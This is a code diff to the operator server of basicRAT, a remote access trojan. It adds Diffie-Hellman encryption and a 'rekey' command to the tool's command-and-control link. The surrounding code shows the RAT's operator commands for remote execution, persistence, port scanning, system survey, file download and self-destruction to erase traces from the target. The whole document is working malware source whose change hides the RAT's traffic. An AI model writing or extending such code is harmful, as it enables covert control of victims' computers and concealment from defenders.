@@ -11,6 +11,8 @@ import socket
 import sys
 import threading
 
+from core.crypto import encrypt, decrypt, diffiehellman
+
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -25,8 +27,8 @@ BANNER = '''
          https://github.com/vesche/basicRAT
 '''
 COMMANDS = [ 'client', 'clients', 'execute', 'goodbye', 'help', 'kill',
-             'persistence', 'quit', 'scan', 'selfdestruct', 'survey', 'unzip',
-             'wget' ]
+             'persistence', 'quit', 'rekey', 'scan', 'selfdestruct', 'survey',
+             'unzip', 'wget' ]
 HELP_TEXT = '''
 client <id>         - Connect to a client.
 clients             - List connected clients.
@@ -36,6 +38,7 @@ help                - Show this help menu.
 kill                - Kill the client connection.
 persistence         - Apply persistence mechanism.
 quit                - Exit the server and destroy all client connections.
+rekey               - Regenerate crypto key.
 scan <ip>           - Scan top 25 TCP ports on a single host.
 selfdestruct        - Remove all traces of the RAT from the target system.
 survey              - Run a system survey.
@@ -58,8 +61,9 @@ class Server(threading.Thread):
     def run(self):
         while True:
             conn, addr = self.s.accept()
+            dhkey = diffiehellman(conn)
             client_id = self.client_count
-            client = ClientConnection(conn, addr, uid=client_id)
+            client = ClientConnection(conn, addr, dhkey, uid=client_id)
             self.clients[client_id] = client
             self.client_count += 1
 
@@ -90,10 +94,11 @@ class Server(threading.Thread):
 
 
 class ClientConnection():
-    def __init__(self, conn, addr, uid=0):
-        self.conn = conn
-        self.addr = addr
-        self.uid  = uid
+    def __init__(self, conn, addr, dhkey, uid=0):
+        self.conn  = conn
+        self.addr  = addr
+        self.dhkey = dhkey
+        self.uid   = uid
 
     alive = True
 
@@ -110,13 +115,13 @@ class ClientConnection():
             if raw_input('Remove all traces of basicRAT from the target ' \
                          'system (y/N)? ').startswith('y'):
                 print 'Running selfdestruct...'
-                self.conn.send(prompt)
+                self.conn.send(encrypt(prompt, self.dhkey))
                 self.conn.close()
             return
 
         # send prompt to client
         try:
-            self.conn.send(prompt)
+            self.conn.send(encrypt(prompt, self.dhkey))
         except socket.error:
             print 'Error: Could not connect to client.'
             return
@@ -126,10 +131,14 @@ class ClientConnection():
         if cmd == 'kill':
             self.conn.close()
 
+        if cmd == 'rekey':
+            self.dhkey = diffiehellman(self.conn)
+
         # results of execute, persistence, scan, survey, unzip, or wget
-        elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
+        if cmd in [ 'execute', 'persistence', 'rekey', 'scan', 'survey',
+                    'unzip', 'wget' ]:
             print 'Running {}...'.format(cmd)
-            recv_data = self.conn.recv(4096)
+            recv_data = decrypt(self.conn.recv(4096), self.dhkey)
             print recv_data
 
 
